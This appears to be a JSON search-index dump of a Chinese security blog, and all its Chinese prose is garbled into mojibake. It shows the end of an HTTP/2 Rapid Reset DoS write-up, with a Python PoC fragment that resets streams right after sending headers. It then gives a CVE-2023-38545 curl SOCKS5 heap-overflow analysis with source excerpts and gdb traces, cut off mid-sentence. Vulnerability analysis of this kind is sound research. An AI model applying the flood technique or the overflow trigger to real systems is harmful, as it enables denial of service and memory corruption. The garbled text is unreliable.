isinstance(event, RequestReceived): # Cancel the stream with error code for CANCEL conn.reset_stream(event.stream_id, error_code=ErrorCodes.CANCEL) elif isinstance(event, StreamReset): print(f\u0026#34;Stream {event.stream_id} cancelled.\u0026#34;) æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å°†æ¥æ”¶æ•°æ®çš„é€»è¾‘å»æ‰ï¼Œæ”¹ä¸ºå‘é€headersä¹‹åç›´æ¥å‘é€resetå³å¯ï¼ŒPoCæ™šäº›æ—¶å€™ä¼šä¸Šä¼ åˆ°\rGitHubä¸Šã€‚ åˆ©ç”¨æ•ˆæœå¦‚ä¸‹ï¼Œå•ä¸ªè¿›ç¨‹å•ä¸ªçº¿ç¨‹å¯ä»¥ä½¿æœåŠ¡CPUå ç”¨20%\nå½“ç„¶è¿™ä¸ªæ¼æ´PoCä¹Ÿé€‚åˆä½¿ç”¨goå†™ï¼Œæˆ‘è¿™è¾¹goå†™çš„å¹¶å‘æœ‰ç‚¹é—®é¢˜ï¼Œä¸å¦‚pythonç‰ˆæœ¬ç¨³å®šã€‚\næŠ“åŒ…åˆ†æ\nè¿è¡ŒPoCæŠ“åŒ…ï¼Œè§£å¯†ï¼Œwiresharkæ‘˜è¦å¦‚ä¸‹ï¼š\nåœ¨æœ¬æ¬¡ç¯å¢ƒä¸­ï¼ŒæœåŠ¡å™¨é€šå‘Šçš„æœ€å¤§å¹¶å‘æµä¸º250ã€‚åœ¨ä¸‹é¢çš„æ•°æ®åŒ…ä¸­ï¼Œå®¢æˆ·ç«¯å…ˆå‘é€HEADERSè¯·æ±‚ï¼Œè€Œåå‘é€RST_STREAMè¯·æ±‚ï¼Œå¾ªç¯å¾€å¤ã€‚\né€šè¿‡è¿™ç§åŠæ³•å®¢æˆ·ç«¯ä¸ç”¨ç­‰å¾…æœåŠ¡å™¨å“åº”ï¼Œå‘é€é€Ÿç‡åªå—è‡ªå·±å¸¦å®½é™åˆ¶ï¼Œä»è€Œå¹¶éæœåŠ¡å™¨åœ¨HTTP2åè®®åˆå§‹åŒ–æ—¶å£°æ˜çš„æœ€å¤§å¹¶å‘æµé™åˆ¶ã€‚\nå°ç»“ HTTP2 DOSåŸç†è¾ƒä¸ºç®€å•ï¼Œåˆ©ç”¨RFCæ‰€è§„å®šçš„åè®®ç‰¹æ€§ï¼Œæœ¬è´¨ä¸Šå±äºæ»¥ç”¨ï¼Œè€ŒCloudFlareå¯¹æ­¤çš„åº”å¯¹ç­–ç•¥æ˜¯å½“å®¢æˆ·ç«¯é‡ç½®æ¬¡æ•°è¶…è¿‡æŸä¸ªé˜ˆå€¼åˆ™è®¤ä¸ºæ˜¯æ¶æ„å®¢æˆ·ç«¯ï¼Œå…³é—­è¯¥è¿æ¥ã€‚\nç”±äºnginxé»˜è®¤é…ç½®ä¸å—å½±å“ï¼Œæ‰€ä»¥å—æ­¤æ¼æ´å½±å“çš„å¤§éƒ¨åˆ†æ˜¯go æˆ–è€…javaå¯åŠ¨çš„HTTPæœåŠ¡ï¼ŒåŒæ—¶å¦‚æœä½¿ç”¨nginxåä»£åç«¯æœåŠ¡ï¼Œå³ä½¿åç«¯æœåŠ¡æ”¯æŒHTTP2ï¼Œnginxä¹Ÿä¼šå°†è¯·æ±‚é™çº§åˆ°HTTP 1.1ã€‚\nå¯é¢„è§çš„å°†æ¥ï¼Œæ­¤æ¬¡è¿™ç§æ¼æ´çš„å‡ºç°ä¸ä¼šæ˜¯æœ€åä¸€æ¬¡ï¼Œhope the internet will become more and more secure.\nå‚è€ƒé“¾æ¥\nhttps://datatracker.ietf.org/doc/html/rfc9113#name-stream-identifiers\nhttps://cloud.google.com/blog/products/identity-security/how-it-works-the-novel-http2-rapid-reset-ddos-attack\nhttps://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/\nhttps://www.nginx.com/blog/http-2-rapid-reset-attack-impacting-f5-nginx-products/\nCreated at 2023-10-13T15:11:25+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-38545-curl-heap-overflow/","title":"CVE-2023-38545 Curl å †æº¢å‡ºæ¼æ´åˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ åœ¨libcurlä¸­å­˜åœ¨å †æº¢å‡ºæ¼æ´ï¼Œå½“libcurlé€šè¿‡socks5ä»£ç†å‘é€è¯·æ±‚æ—¶ï¼Œå¦‚æœhostnameå¤§äº255åˆ™ä¼šåœ¨æœ¬åœ°è§£æï¼Œä½†ç”±äºçŠ¶æ€æœºé”™è¯¯å¯¼è‡´æ²¡æœ‰æŒ‰ç…§é¢„æœŸè§£æï¼Œè€Œæ˜¯æŠŠä¸»æœºåæ‹·è´åˆ°ç¼“å†²åŒºä¸­ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ è¶…é•¿ä¸»æœºåè§¦å‘å †æº¢å‡ºã€‚\nå½±å“ç‰ˆæœ¬ 7.69.0 \u0026lt;= libcurl \u0026lt;= 8.3.4\nç¯å¢ƒæ­å»º sudo apt-get build-dep curl autoreconf ./configure --with-openssl --prefix=$HOME/code/c/curl-8.3.0/build --enable-debug make -j 16 make install æŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• è¡¥ä¸ æ¼æ´åœ¨\rfb4415d8aee6c1045be932a34fe6107c2f5ed147ä¿®å¤ï¼Œä¿®å¤ä»£ç å¦‚ä¸‹ ä»ä¿®å¤ä»£ç ä¸­å¯ä»¥çœ‹å‡ºä¸¤ä¸ªåŒºåˆ«\nå½“socks5_resolve_local=false and hostname_len \u0026gt;255 æ—¶è¿”å›CURLPX_LONG_HOSTNAMEé”™è¯¯ç ï¼Œè€ŒåŸå…ˆé€»è¾‘ä¸ºå°†socks5_resolve_localè®¾ä¸ºtrue å°†hostname_lenè½¬ä¸ºunsigned charåèµ‹å€¼ç»™socksreq[len++] ä¿®å¤ä»£ç ä½äºdo_SOCKS5å‡½æ•°ï¼Œè¯¥å‡½æ•°ç”±connect_SOCKSå‡½æ•°è°ƒç”¨ static CURLcode connect_SOCKS(struct Curl_cfilter *cf, struct socks_state *sxstate, struct Curl_easy *data) { ...... switch(conn-\u0026gt;socks_proxy.proxytype) { case CURLPROXY_SOCKS5: case CURLPROXY_SOCKS5_HOSTNAME: pxresult = do_SOCKS5(cf, sxstate, data); break; å‘ä¸Šè¿½æº¯connect_SOCKSç”±socks_proxy_cf_connectè°ƒç”¨ï¼Œsocks_proxy_cf_connectè¢«å­˜å‚¨åœ¨äº†ä¸€ä¸ªç»“æ„ä½“ä¸­\nstatic CURLcode socks_proxy_cf_connect(struct Curl_cfilter *cf, struct Curl_easy *data, bool blocking, bool *done) { CURLcode result; struct connectdata *conn = cf-\u0026gt;conn; int sockindex = cf-\u0026gt;sockindex; struct socks_state *sx = cf-\u0026gt;ctx; if(cf-\u0026gt;connected) { *done = TRUE; return CURLE_OK; } result = cf-\u0026gt;next-\u0026gt;cft-\u0026gt;do_connect(cf-\u0026gt;next, data, blocking, done); if(result || !*done) return result; if(!sx) { sx = calloc(sizeof(*sx), 1); if(!sx) return CURLE_OUT_OF_MEMORY; cf-\u0026gt;ctx = sx; } if(sx-\u0026gt;state == CONNECT_INIT) { /* for the secondary socket (FTP), use the \u0026#34;connect to host\u0026#34; * but ignore the \u0026#34;connect to port\u0026#34; (use the secondary port) */ sxstate(sx, data, CONNECT_SOCKS_INIT); sx-\u0026gt;hostname = conn-\u0026gt;bits.httpproxy ? conn-\u0026gt;http_proxy.host.name : conn-\u0026gt;bits.conn_to_host ? conn-\u0026gt;conn_to_host.name : sockindex == SECONDARYSOCKET ? conn-\u0026gt;secondaryhostname : conn-\u0026gt;host.name; sx-\u0026gt;remote_port = conn-\u0026gt;bits.httpproxy ? (int)conn-\u0026gt;http_proxy.port : sockindex == SECONDARYSOCKET ? conn-\u0026gt;secondary_port : conn-\u0026gt;bits.conn_to_port ? conn-\u0026gt;conn_to_port : conn-\u0026gt;remote_port; sx-\u0026gt;proxy_user = conn-\u0026gt;socks_proxy.user; sx-\u0026gt;proxy_password = conn-\u0026gt;socks_proxy.passwd; } result = connect_SOCKS(cf, sx, data); struct Curl_cftype Curl_cft_socks_proxy = { \u0026#34;SOCKS-PROXYY\u0026#34;, CF_TYPE_IP_CONNECT, 0, socks_proxy_cf_destroy, socks_proxy_cf_connect, socks_proxy_cf_close, socks_cf_get_host, socks_cf_get_select_socks, Curl_cf_def_data_pending, Curl_cf_def_send, Curl_cf_def_recv, Curl_cf_def_cntrl, Curl_cf_def_conn_is_alive, Curl_cf_def_conn_keep_alive, Curl_cf_def_query, }; æŠ€æœ¯åˆ†æå’ŒåŠ¨æ€è°ƒè¯• æœ¬æ¬¡ä¿®å¤çš„å‡½æ•°do_SOCKS5å®ç°äº†å¤„ç†SOCKS5è¿æ¥ä¸­çš„å„ä¸ªçŠ¶æ€çš„ä»£ç ï¼Œè¿™ä¸ªå‡½æ•°å®ç°äº†ä¸€ä¸ªçŠ¶æ€æœºï¼ŒçŠ¶æ€æœºæ ¹æ®åœ¨socksè¿æ¥ä¸­çš„ä¸åŒçŠ¶æ€è¿›è¡Œä¸åŒæ“ä½œï¼Œç¬¬ä¸€æ¬¡è°ƒç”¨do_SOCKS5æ—¶ï¼Œsocks5_resolve_localè¢«åˆå§‹åŒ–ä¸º falseï¼ŒåŒæ—¶çŠ¶æ€æœºçŠ¶æ€ä¸ºCONNECT_SOCKS_INIT\nbool socks5_resolve_local = (conn-\u0026gt;socks_proxy.proxytype == CURLPROXY_SOCKS5) ? TRUE : FALSE; gefâ¤ p socks5_resolve_local $5 = 0x0 å‡½æ•°è¿›å…¥CONNECT_SOCKS_INITåˆ†æ”¯ï¼Œç”±äºä¼ é€’ç»™curlçš„ä¸»æœºåè¶…é•¿ï¼Œå¤§äº255ï¼Œè¿›å…¥ifä¸­ï¼Œsocks5_resolve_localè¢«èµ‹å€¼ä¸ºtrueï¼Œä»£è¡¨æ­¤æ—¶åº”è¯¥ä½¿ç”¨æœ¬åœ°è§£æ\nswitch(sx-\u0026gt;state) { case CONNECT_SOCKS_INIT: if(conn-\u0026gt;bits.httpproxy) infof(data, \u0026#34;SOCKS5: connecting to HTTP proxy %s port %d\u0026#34;, sx-\u0026gt;hostname, sx-\u0026gt;remote_port); /* RFC1928 chapter 5 specifies max 255 chars for domain name in packet */ if(!socks5_resolve_local \u0026amp;\u0026amp; hostname_len \u0026gt; 255) { infof(data, \u0026#34;SOCKS5: server resolving disabled for hostnames of \u0026#34; \u0026#34;length \u0026gt; 255 [actual len=%zu]\u0026#34;, hostname_len); socks5_resolve_local = TRUE; } æ­¤æ—¶è°ƒç”¨æ ˆå¦‚ä¸‹ï¼š\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ source:socks.c+595 â”€â”€â”€â”€ 590 infof(data, \u0026#34;SOCKS5: server resolving disabled for hostnames of \u0026#34; 591 \u0026#34;length \u0026gt; 255 [actual len=%zu]\u0026#34;, hostname_len); 592 socks5_resolve_local = TRUE; 593 } 594 // auth=0x5 â†’ 595 if(auth \u0026amp; ~(CURLAUTH_BASIC | CURLAUTH_GSSAPI)) 596 infof(data, 597 \u0026#34;warning: unsupported value passed to CURLOPT_SOCKS5_AUTH: %u\u0026#34;, 598 auth); 599 if(!(auth \u0026amp; CURLAUTH_BASIC)) 600 /* disable username/password auth */ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ threads â”€â”€â”€â”€ [#0] Id 1, Name: \u0026#34;curl\u0026#34;, stopped 0x7ffff7f4906d in do_SOCKS5 (), reason: SINGLE STEP â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ trace â”€â”€â”€â”€ gefâ¤ p socks5_resolve_local $6 = 0x1 gefâ¤ bt #0 do_SOCKS5 (cf=0x5555555e6428, sx=0x5555555e6468, data=0x5555555e6ef8) at socks.c:573 #1 0x00007ffff7f4a137 in connect_SOCKS (cf=0x5555555e6428, sxstate=0x5555555e6468, data=0x5555555e6ef8) at socks.c:1067 #2 0x00007ffff7f4a3f1 in socks_proxy_cf_connect (cf=0x5555555e6428, data=0x5555555e6ef8, blocking=0x0, done=0x7fffffffb667) at socks.c:1149 #3 0x00007ffff7ed6635 in Curl_conn_cf_connect (cf=0x5555555e6428, data=0x5555555e6ef8, blocking=0x0, done=0x7fffffffb667) at cfilters.c:296 #4 0x00007ffff7edaa4d in cf_setup_connect (cf=0x5555555e6348, data=0x5555555e6ef8, blocking=0x0, done=0x7fffffffb667) at connect.c:1201 #5 0x00007ffff7ed68a1 in Curl_conn_connect (data=0x5555555e6ef8, sockindex=0x0, blocking=0x0, done=0x7fffffffb667) at cfilters.c:351 #6 0x00007ffff7f276b7 in multi_runsingle (multi=0x5555555dd868, nowp=0x7fffffffb6f0, data=0x5555555e6ef8) at multi.c:2106 #7 0x00007ffff7f28d94 in curl_multi_perform (multi=0x5555555dd868, running_handles=0x7fffffffb754) at multi.c:2742 #8 0x00007ffff7eeb1e6 in easy_transfer (multi=0x5555555dd868) at easy.c:682 #9 0x00007ffff7eeb3d4 in easy_perform (data=0x5555555e6ef8, events=0x0) at easy.c:772 #10 0x00007ffff7eeb40c in curl_easy_perform (data=0x5555555e6ef8) at easy.c:791 #11 0x000055555557a1f3 in serial_transfers (global=0x7fffffffb900, share=0x5555555d9f08) at tool_operate.c:2479 #12 0x000055555557a7c1 in run_all_transfers (global=0x7fffffffb900, share=0x5555555d9f08, result=CURLE_OK) at tool_operate.c:2670 #13 0x000055555557ab6c in operate (global=0x7fffffffb900, argc=0x7, argv=0x7fffffffba98) at tool_operate.c:2786 #14 0x00005555555710f8 in main (argc=0x7, argv=0x7fffffffba98) at tool_main.c:274 gefâ¤ åœ¨è¿™çŠ¶æ€ä¸‹ï¼Œcurlä¼šåˆå§‹åŒ–ä¸€äº›SOCKSè¯·æ±‚bodyå¹¶å°†å…¶å‘é€ç»™socks serverï¼Œè€Œåå°†çŠ¶æ€è½¬ä¸º CONNECT_SOCKS_READ_INITå¹¶è·³è½¬åˆ°å¯¹åº”ä»£ç å¤„ã€‚\nidx = 0; socksreq[idx++] = 5; /* version */ idx++; /* number of authentication methods */ socksreq[idx++] = 0; /* no authentication */ if(allow_gssapi) socksreq[idx++] = 1; /* GSS-API */ if(sx-\u0026gt;proxy_user) socksreq[idx++] = 2; /* username/password */ /* write the number of authentication methods */ socksreq[1] = (unsigned char) (idx - 2); sx-\u0026gt;outp = socksreq; sx-\u0026gt;outstanding = idx; presult = socks_state_send(cf, sx, data, CURLPX_SEND_CONNECT, ...... sxstate(sx, data, CONNECT_SOCKS_READ); goto CONNECT_SOCKS_READ_INIT; åœ¨çŠ¶æ€ CONNECT_SOCKS_READ_INITä¸­ï¼Œä¼šèµ‹å€¼ç»“æ„ä½“æˆå‘˜è€Œåå°†çŠ¶æ€è½¬ä¸º CONNECT_SOCKS_READï¼Œcurlä¼šå°è¯•ä»TCPè¿æ¥ä¸­è¯»å–æ•°æ®\ncase CONNECT_SOCKS_READ_INIT: sx-\u0026gt;outstanding = 2; /* expect two bytes */ sx-\u0026gt;outp = socksreq; /* store it here */ /* FALLTHROUGH */ case CONNECT_SOCKS_READ: presult = socks_state_recv(cf, sx, data, CURLPX_RECV_CONNECT, \u0026#34;initial SOCKS5 response\u0026#34;); if(CURLPX_OK != presult) return presult; else if(sx-\u0026gt;outstanding) { /* remain in reading state */ return CURLPX_OK; } è¯»å–æ•°æ®æ—¶ï¼Œå…¶è°ƒç”¨æ ˆå¦‚ä¸‹\ngefâ¤ bt #0 cf_socket_recv (cf=0x5555555e6a28, data=0x5555555e6ef8, buf=0x5555555ddb48 \u0026#34;\\005\\001\u0026#34;, len=0x2, err=0x7fffffffb3a4) at cf-socket.c:1352 #1 0x00007ffff7ed5d95 in Curl_cf_def_recv (cf=0x5555555e63e8, data=0x5555555e6ef8, buf=0x5555555ddb48 \u0026#34;\\005\\001\u0026#34;, len=0x2, err=0x7fffffffb3a4) at cfilters.c:100 #2 0x00007ffff7ed6762 in Curl_conn_cf_recv (cf=0x5555555e63e8, data=0x5555555e6ef8, buf=0x5555555ddb48 \u0026#34;\\005\\001\u0026#34;, len=0x2, err=0x7fffffffb3a4) at cfilters.c:328 #3 0x00007ffff7f4839a in socks_state_recv (cf=0x5555555e6428, sx=0x5555555e6468, data=0x5555555e6ef8, failcode=CURLPX_RECV_CONNECT, description=0x7ffff7f82254 \u0026#34;initial SOCKS5 response\u0026#34;) at socks.c:241 #4 0x00007ffff7f49274 in do_SOCKS5 (cf=0x5555555e6428, sx=0x5555555e6468, data=0x5555555e6ef8) at socks.c:646 #5 0x00007ffff7f4a137 in connect_SOCKS (cf=0x5555555e6428, sxstate=0x5555555e6468, data=0x5555555e6ef8) at socks.c:1067 #6 0x00007ffff7f4a3f1 in socks_proxy_cf_connect (cf=0x5555555e6428, data=0x5555555e6ef8, blocking=0x0, done=0x7fffffffb667) at socks.c:1149 #7 0x00007ffff7ed6635 in Curl_conn_cf_connect (cf=0x5555555e6428, data=0x5555555e6ef8, blocking=0x0, done=0x7fffffffb667) at cfilters.c:296 #8 0x00007ffff7edaa4d in cf_setup_connect (cf=0x5555555e6348, data=0x5555555e6ef8, blocking=0x0, done=0x7fffffffb667) at connect.c:1201 #9 0x00007ffff7ed68a1 in Curl_conn_connect (data=0x5555555e6ef8, sockindex=0x0, blocking=0x0, done=0x7fffffffb667) at cfilters.c:351 #10 0x00007ffff7f276b7 in multi_runsingle (multi=0x5555555dd868, nowp=0x7fffffffb6f0, data=0x5555555e6ef8) at multi.c:2106 #11 0x00007ffff7f28d94 in curl_multi_perform (multi=0x5555555dd868, running_handles=0x7fffffffb754) at multi.c:2742 #12 0x00007ffff7eeb1e6 in easy_transfer (multi=0x5555555dd868) at easy.c:682 #13 0x00007ffff7eeb3d4 in easy_perform (data=0x5555555e6ef8, events=0x0) at easy.c:772 #14 0x00007ffff7eeb40c in curl_easy_perform (data=0x5555555e6ef8) at easy.c:791 #15 0x000055555557a1f3 in serial_transfers (global=0x7fffffffb900, share=0x5555555d9f08) at tool_operate.c:2479 #16 0x000055555557a7c1 in run_all_transfers (global=0x7fffffffb900, share=0x5555555d9f08, result=CURLE_OK) at tool_operate.c:2670 #17 0x000055555557ab6c in operate (global=0x7fffffffb900, argc=0x7, argv=0x7fffffffba98) at tool_operate.c:2786 #18 0x00005555555710f8 in main (argc=0x7, argv=0x7fffffffba98) at tool_main.c:274 è®©æˆ‘ä»¬æŠŠä»£ç æ”¾åœ¨ä¸€èµ·çœ‹ï¼Œåœ¨do_SOCKS5å‡½æ•°ä¸­ï¼Œå°† sx-\u0026gt;outstandingèµ‹å€¼ä¸º2ï¼Œå°è¯•è°ƒç”¨ socks_state_recvä»TCP sockä¸­è¯»å–ä¸¤ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œç»è¿‡å±‚å±‚è°ƒç”¨æœ€ç»ˆè¿›å…¥åˆ° nw_in_readå‡½æ•°ä¸­ï¼Œè°ƒç”¨recvå‡½æ•°ä»sockä¸­è¯»å–æ•°æ®ã€‚\npresult = socks_state_recv(cf, sx, data, CURLPX_RECV_CONNECT, \u0026#34;initial SOCKS5 response\u0026#34;); if(CURLPX_OK != presult) return presult; else if(sx-\u0026gt;outstanding) { /* remain in reading state */ return CURLPX_OK; } static CURLproxycode socks_state_recv(struct Curl_cfilter *cf, ..... { ssize_t nread; CURLcode result; nread = Curl_conn_cf_recv(cf-\u0026gt;next, data, (char *)sx-\u0026gt;outp, sx-\u0026gt;outstanding, \u0026amp;result); ...... sx-\u0026gt;outstanding -= nread; return CURLPX_OK; } ssize_t Curl_conn_cf_recv(struct Curl_cfilter *cf, struct Curl_easy *data, { if(cf) return cf-\u0026gt;cft-\u0026gt;do_recv(cf, data, buf, len, err); *err = CURLE_RECV_ERROR; return -1; } static ssize_t cf_socket_recv(struct Curl_cfilter *cf, struct Curl_easy *data, char *buf, size_t len, CURLcode *err) { struct cf_socket_ctx *ctx = cf-\u0026gt;ctx; curl_socket_t fdsave; ssize_t nread; *err = CURLE_OK; fdsave = cf-\u0026gt;conn-\u0026gt;sock[cf-\u0026gt;sockindex]; cf-\u0026gt;conn-\u0026gt;sock[cf-\u0026gt;sockindex] = ctx-\u0026gt;sock; ...... else { nread = nw_in_read(\u0026amp;rctx, (unsigned char *)buf, len, err); ...... return nread; } static ssize_t nw_in_read(void *reader_ctx, unsigned char *buf, size_t len, CURLcode *err) { struct reader_ctx *rctx = reader_ctx; struct cf_socket_ctx *ctx = rctx-\u0026gt;cf-\u0026gt;ctx; ssize_t nread; *err = CURLE_OK; nread = sread(ctx-\u0026gt;sock, buf, len); ...... return nread; } #define sread(x,y,z) (ssize_t)recv((RECV_TYPE_ARG1)(x), \\ (RECV_TYPE_ARG2)(y), \\ (RECV_TYPE_ARG3)(z), \\ (RECV_TYPE_ARG4)(0)) æ ¹æ®RFC1928ï¼ŒæœåŠ¡å™¨ä¼šåœ¨å®¢æˆ·ç«¯å‘é€helloåŒ…ä¹‹åè¿”å›ï¼Œé€‰æ‹©é€šä¿¡æ–¹æ³•åè¿”å›server hello client hello server hello æ­£å¸¸æƒ…å†µä¸‹ï¼ŒsocksæœåŠ¡å™¨è¿”å›server helloä¹‹åï¼Œsocks_state_recvè¯»å–äº†ä¸¤ä¸ªå­—èŠ‚çš„æ•°æ®å¹¶é€šè¿‡ sx-\u0026gt;outstanding -= nread;ä½¿å¾—outstanding=0ï¼Œä¹‹ååœ¨çŠ¶æ€æœºå†…ä¼šç»§ç»­å¤„ç†socksè¿æ¥ã€‚\nä½†å¦‚æœæ”»å‡»è€…å¯æ§socksæœåŠ¡å™¨ï¼Œå¹¶å¼ºè¿«åœ¨æœåŠ¡å™¨åœ¨client å‘é€helloä¹‹åï¼Œè¿‡äº†client è®¾ç½®çš„sock timeoutåœ¨è¿”å›æ•°æ®åŒ…çš„è¯ä¼šæ€ä¹ˆæ ·ï¼Ÿ recvå‡½æ•°å¦‚æœåœ¨setsockoptè®¾ç½®çš„è¶…æ—¶æ—¶é—´å†…è¿˜æ²¡æœ‰ä»TCPè¿æ¥è¯»å–åˆ°æ•°æ®çš„è¯ï¼Œåˆ™ä¼šè¿”å›-1ï¼Œå¹¶ä¸”errè¢«è®¾ç½®ä¸ºCURLE_AGAIN ï¼Œåœ¨ socks_state_recvå‡½æ•°ä¸­å› ä¸ºè¯»å–åˆ°çš„nread=-1ï¼Œæ‰€ä»¥è¿™ä¸ªå‡½æ•°è¿”å›CURLPX_OKã€‚\nè¿”å›åˆ°çŠ¶æ€æœºä¸­ï¼Œpresult=CURLPX_OKï¼Œsx-\u0026gt;outstanding=2ï¼Œdo_SOCKS5å‡½æ•°è¿”å›CURLPX_OKï¼Œå› ä¸ºæ²¡è¯»æ•°æ®ï¼Œæ‰€ä»¥åœ¨easy.cä¸­ä¼šç»§ç»­å¾ªç¯ã€‚\nstatic CURLcode easy_transfer(struct Curl_multi *multi) { bool done = FALSE; CURLMcode mcode = CURLM_OK; CURLcode result = CURLE_OK; while(!done \u0026amp;\u0026amp; !mcode) { int still_running = 0; mcode = curl_multi_poll(multi, NULL, 0, 1000, NULL); if(!mcode) mcode = curl_multi_perform(multi, \u0026amp;still_running); /* only read \u0026#39;still_running\u0026#39; if curl_multi_perform() return OK */ if(!mcode \u0026amp;\u0026amp; !still_running) { int rc; CURLMsg *msg = curl_multi_info_read(multi, \u0026amp;rc); if(msg) { result = msg-\u0026gt;data.result; done = TRUE; } } } /* Make sure to return some kind of error if there was a multi problem */ if(mcode) { result = (mcode == CURLM_OUT_OF_MEMORY) ? CURLE_OUT_OF_MEMORY : /* The other multi errors should never happen, so return something suitably generic */ CURLE_BAD_FUNCTION_ARGUMENT; } return result; } æ­¤æ—¶socksæœåŠ¡å™¨è¿”å›æ•°æ®çš„è¯ï¼Œå†æ¬¡è¿›å…¥åˆ°do_SOCKS5å‡½æ•°ï¼Œæ­¤æ—¶åœ¨å‡½æ•°å¼€å¤´socks5_resolve_local=falseï¼Œè¿›å…¥åˆ°çŠ¶æ€æœºä¸­ï¼Œç”±äºæ­¤æ—¶çŠ¶æ€ä¸å†æ˜¯CONNECT_SOCKS_INITï¼Œæ‰€ä»¥socks5_resolve_localä¸ä¼šè¢«è®¾ç½®ä¸ºtrueï¼Œæ­¤æ—¶åœ¨çŠ¶æ€CONNECT_REQ_INITæ—¶ï¼ŒçŠ¶æ€æœºä¼šè·³è½¬åˆ°çŠ¶æ€CONNECT_RESOLVE_REMOTEï¼Œä¹Ÿå°±æ˜¯curlå°è¯•è®©socksæœåŠ¡å™¨è¿›è¡ŒDNSè§£æå¹¶è¯·æ±‚ã€‚\nunsigned char *socksreq = (unsigned char *)data-\u0026gt;state.buffer; const size_t hostname_len = strlen(sx-\u0026gt;hostname); CONNECT_RESOLVE_REMOTE: case CONNECT_RESOLVE_REMOTE: /* Authentication is complete, now specify destination to the proxy */ len = 0; socksreq[len++] = 5; /* version (SOCKS5) */ socksreq[len++] = 1; /* connect */ socksreq[len++] = 0; /* must be zero */ if(!socks5_resolve_local) { ...... memcpy(\u0026amp;socksreq[len], sx-\u0026gt;hostname, hostname_len); /* w/o NULL */ ...... } /* FALLTHROUGH */ æ­¤æ—¶curlä¼šå°è¯•å°†ä¸»æœºåé€šè¿‡memcpyæ‹·è´åˆ°tcp 